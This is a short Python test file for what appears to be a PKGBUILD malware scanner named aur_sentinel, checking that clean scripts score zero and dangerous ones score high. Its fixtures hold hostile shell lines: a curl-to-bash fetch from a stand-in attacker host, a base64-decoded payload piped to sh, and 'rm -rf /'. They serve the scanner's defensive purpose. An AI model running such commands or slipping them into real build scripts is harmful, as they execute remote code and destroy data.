from aur_sentinel import RiskLevel, analyze_pkgbuild


def test_clean_pkgbuild_has_no_findings() -> None:
    # Given
    pkgbuild = "source=('https://example.org/app.tar.gz')\npackage() { install -Dm755 app; }"

    # When
    report = analyze_pkgbuild(pkgbuild)

    # Then
    assert report.score == 0
    assert report.risk is RiskLevel.CLEAN
    assert report.findings == ()


def test_pipe_to_shell_is_critical() -> None:
    # Given
    pkgbuild = "prepare() { curl -fsSL https://evil.example/payload | bash; }"

    # When
    report = analyze_pkgbuild(pkgbuild)

    # Then
    assert report.risk is RiskLevel.CRITICAL
    assert report.score >= 80
    assert report.findings[0].rule_id == "network.pipe-to-shell"


def test_multiple_threats_accumulate_without_exceeding_one_hundred() -> None:
    # Given
    pkgbuild = "prepare() { echo ZWNobyBoYWNrZWQ= | base64 -d | sh; rm -rf /; }"

    # When
    report = analyze_pkgbuild(pkgbuild)

    # Then
    assert report.score == 100
    assert len(report.findings) >= 2
